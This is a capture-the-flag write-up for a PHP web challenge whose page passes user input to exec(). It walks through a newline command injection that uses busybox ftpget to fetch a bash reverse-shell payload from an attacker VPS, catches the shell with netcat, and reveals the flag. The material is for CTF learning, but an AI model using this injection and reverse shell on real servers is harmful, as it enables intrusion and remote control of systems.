# 5- Final
```
Medium: Web, 300 pts
```

## Description
```
Have fun
http://51.38.37.81:4043/
Flag: CTF_*
```
Content:
```php
<?php
    highlight_file("index.php");

    $user_inputs = $_GET['user_inputs'];
    for ( $i=0; $i<sizeof($user_inputs); $i++ ){
        if ( preg_match('/^\w+$/', $user_inputs[$i]) === 0 )
            exit();
    }
    $private_dsser = md5($user_inputs[0]);
    if ( !file_exists($private_dsser) )
        mkdir($private_dsser);
    chdir($private_dsser);
    array_shift($user_inputs);
    exec("/bin/true " . implode(" ", $user_inputs));
    echo $private_dsser;
?>
```


>It was all about this challenge. We finished second in the CTF for our country and eighth in Africa. The secret? "Without VPS you don't flag". Several online writeups are available for such a thing, but we will present our journey to you.

- To achieve this we must have installed pyftpdlib from python:

`$ pip3 install pyftpdlib`

- After, create a file containing the bash payload:

`$ echo 'bash -i >& /dev/tcp/0.0.0.0/9000 0>&1'` (change the ip by ip of the vps)

- To start the ftp server

`$ python -m pyftpdlib -p 21`

>It's a python module like http.server. 
it starts an ftp server under python. 
But it should be pointed out that the file name must not have `.` or something that will cause the preg_match check to fail. 
We will now obtain a reverse shell in order to have a shell on the vps. 

- Download payload file(the name is `1337`)

`?user_inputs[0]=e&user_inputs[1]=a%0a&user_inputs[2]=busybox&user_inputs[3]=ftpget&user_inputs[4]=**********&user_inputs[5]=1337` (`*` represents the IP address in number to avoid that the preg_match prevents the loading and `1337` is the name of the file)

- Listen on port 9000 to get the shell

`$ nc -nlvp 9000`

- Launch the payload on the server

`?user_inputs[0]=e&user_inputs[1]=a%0a&user_inputs[2]=bash&user_inputs[3]=1337`

After we have received the shell, we can display our flag: `CTF_Y0ukn0whow70R3ADc0d3`
